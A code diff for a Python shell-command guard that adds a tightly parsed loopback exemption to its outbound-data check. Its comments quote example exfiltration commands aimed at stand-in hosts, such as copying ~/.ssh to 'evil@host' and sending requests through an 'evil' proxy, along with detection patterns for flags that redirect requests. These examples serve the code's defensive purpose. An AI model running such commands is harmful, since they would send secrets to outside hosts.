@@ -2,8 +2,10 @@
 
 from __future__ import annotations
 
+import ipaddress
 import os
 import re
+import shlex
 from dataclasses import dataclass
 from enum import Enum
 from pathlib import Path
@@ -292,6 +294,82 @@ _RE_OUTBOUND_DATA = re.compile(
     re.IGNORECASE,
 )
 
+# #1683: flags that send the request somewhere other than the URL says. Their presence
+# disables the loopback exemption entirely — `curl -x http://evil:8080 … http://127.0.0.1/`
+# reads as local and is not, and `--resolve`/`--connect-to` repoint the hostname outright.
+# A loopback exemption that ignored these would be an exfiltration channel with a
+# reassuring URL.
+#
+# CASE-SENSITIVE, AND THAT IS THE WHOLE POINT OF NOT USING re.IGNORECASE HERE. In curl
+# `-x` is the PROXY flag and `-X` is the REQUEST METHOD — they differ by case alone. The
+# first version of this pattern was case-insensitive, so every `-X POST` in the fleet read
+# as "goes through a proxy" and the exemption never applied to a single real command. It
+# was caught by the corpus in this ticket's own test file, which is the argument for the
+# corpus in one line. Long options are lowercase by curl convention.
+_RE_DESTINATION_REMAP = re.compile(
+    r"(?:^|\s)(?:-x|--proxy|--proxy1\.0|--preproxy|--socks4|--socks4a|--socks5"
+    r"|--socks5-hostname|--resolve|--connect-to)\b"
+)
+
+# Flags that take a VALUE. The value is skipped when scanning for destinations, which
+# matters in both directions: it stops `-H 'Host: …'` looking like a target, and stops
+# the very common `-d "$BODY"` from tripping the dynamic-target bail-out.
+_ARG_TAKING_FLAGS = frozenset(
+    {
+        "-d",
+        "--data",
+        "--data-raw",
+        "--data-binary",
+        "--data-ascii",
+        "--data-urlencode",
+        "-F",
+        "--form",
+        "--form-string",
+        "-H",
+        "--header",
+        "-T",
+        "--upload-file",
+        "-u",
+        "--user",
+        "-A",
+        "--user-agent",
+        "-e",
+        "--referer",
+        "-b",
+        "--cookie",
+        "-c",
+        "--cookie-jar",
+        "-o",
+        "--output",
+        "-X",
+        "--request",
+        "--url",
+        "--post-data",
+        "--post-file",
+        "--body-data",
+        "--body-file",
+        "--method",
+        "-O",
+        "--header-file",
+        "--ca-certificate",
+        "--certificate",
+        "--private-key",
+    }
+)
+
+# A destination carrying an explicit scheme. The capture is the HOST only — userinfo is
+# dropped (`http://user@host/`) so `http://127.0.0.1@evil.example/` cannot pose as local.
+_RE_SCHEMED_URL = re.compile(
+    r"[a-z][a-z0-9+.-]*://(?:[^/\s'\"@]*@)?(\[[0-9A-Fa-f:.]+\]|[^/\s'\":?#]+)",
+    re.IGNORECASE,
+)
+# A scheme-less destination, which curl accepts (`curl localhost:9090/x`). The explicit
+# port is required so ordinary filenames and header values cannot be read as hosts.
+_RE_BARE_HOSTPORT = re.compile(r"(\[[0-9A-Fa-f:.]+\]|[A-Za-z0-9._-]+):\d+(?:/\S*)?$")
+
+# Shell constructs that hide a destination behind text this layer cannot see.
+_RE_DYNAMIC_TARGET = re.compile(r"\$\{?\w|\$\(|`")
+
 # #1657: A CREDENTIAL DIRECTORY BEING MOVED, which the path list above misses by one
 # character. `_RE_SENSITIVE_PATH` requires a trailing slash on the directory forms
 # (`~/.ssh/`), so `cat ~/.ssh/id_rsa` is caught and `scp -r ~/.ssh evil@host:` is NOT —
@@ -329,8 +407,81 @@ def reads_sensitive_path(cmd: str) -> bool:
     return bool(_RE_SENSITIVE_PATH.search(cmd)) or bool(_RE_SENSITIVE_DIR_MOVED.search(cmd))
 
 
+def _is_loopback_host(host: str) -> bool:
+    """True when *host* is unambiguously this machine.
+
+    EXACT MATCH, NEVER SUBSTRING. `"127.0.0.1" in cmd` is the one-liner this invites, and
+    it hands the exemption to anyone who registers `localhost.evil.example` or appends
+    `#http://127.0.0.1` to a URL. Parsing the host and comparing it is the only version
+    that holds.
+    """
+    h = host.strip().strip("'\"").lower().rstrip(".")
+    if h.startswith("[") and h.endswith("]"):
+        h = h[1:-1]
+    if h == "localhost" or h.endswith(".localhost"):
+        return True
+    try:
+        # Covers all of 127.0.0.0/8 (the resolver uses 127.0.0.53) and ::1. Private
+        # ranges are deliberately NOT loopback: a payload to 192.168.1.50 has left
+        # this host, which is the thing the guard is about.
+        return ipaddress.ip_address(h).is_loopback
+    except ValueError:
+        return False
+
+
+def _targets_only_loopback(cmd: str) -> bool:
+    """True when every destination in *cmd* is positively identified as this machine.
+
+    FAILS CLOSED. "Could not tell" is not "is local", so an unparseable command, a
+    destination in a variable, or any flag that repoints the request keeps the old DENY.
+    Same stance ``writes_outside_worktree`` takes on redirect targets it cannot read:
+    silently allowing what it failed to parse is how a guard becomes decorative.
+
+    Hosts are read ONLY from tokens that are not flags and not flag ARGUMENTS. That
+    exclusion is load-bearing in both directions — it keeps `-H 'Host: …'` from being
+    mistaken for a destination, and it keeps the very common `-d "$BODY"` from tripping
+    the dynamic-target bail-out, which would re-introduce the false positive this
+    function exists to remove.
+    """
+    if _RE_DESTINATION_REMAP.search(cmd):
+        return False
+    try:
+        tokens = shlex.split(cmd)
+    except ValueError:
+        # Unbalanced quotes — the command cannot be read with confidence.
+        return False
+
+    hosts: list[str] = []
+    skip_next = False
+    for token in tokens:
+        if skip_next:
+            skip_next = False
+            continue
+        head = token.split("=", 1)[0]
+        if head in _ARG_TAKING_FLAGS:
+            skip_next = "=" not in token
+            continue
+        if token.startswith("-"):
+            continue
+        if _RE_DYNAMIC_TARGET.search(token):
+            # A destination-position token containing a substitution: the executed
+            # text is not statically knowable, so no host check can clear it.
+            return False
+        scheme_match = _RE_SCHEMED_URL.match(token)
+        if scheme_match:
+            hosts.append(scheme_match.group(1))
+            continue
+        bare_match = _RE_BARE_HOSTPORT.match(token)
+        if bare_match:
+            hosts.append(bare_match.group(1))
+
+    if not hosts:
+        return False
+    return all(_is_loopback_host(h) for h in hosts)
+
+
 def sends_data_outbound(cmd: str) -> bool:
-    """True when *cmd* uses an HTTP client to SEND a payload.
+    """True when *cmd* uses an HTTP client to SEND a payload OFF THIS HOST.
 
     REFUSES ON THE PAYLOAD, NOT THE METHOD, and the choice matters. A "GET/HEAD only"
     rule would reject `curl -X GET` (explicit and harmless) while still approving
@@ -338,8 +489,20 @@ def sends_data_outbound(cmd: str) -> bool:
     presence of a body. Targeting `-d`/`--data`/`-F`/`-T`/`--upload-file` and the
     mutating methods hits the exfiltration channel directly and leaves the
     overwhelmingly common `curl <url>` working — which is what keeps this switched on.
+
+    #1683: LOOPBACK IS EXEMPT, because the guard is about a payload LEAVING THE HOST and
+    a request to 127.0.0.1 has not left it. Found by tripping over it — a worker calling
+    its own daemon API with a body is constant, ordinary work, and this DENIED it. That
+    was the third false positive of one shape on this guard family (`2>/dev/null`,
+    `cd X && Y`, and this), all three judging a command by what it LOOKED like rather
+    than what it would DO.
+
+    THE EXEMPTION IS SCOPED TO THIS GUARD. `curl -d @.env http://127.0.0.1/x` is still
+    refused, by ``reads_sensitive_path`` — a different control, with a different reason.
     """
-    return bool(_RE_OUTBOUND_DATA.search(cmd))
+    if not _RE_OUTBOUND_DATA.search(cmd):
+        return False
+    return not _targets_only_loopback(cmd)
 
 
 def writes_outside_worktree(cmd: str) -> bool:
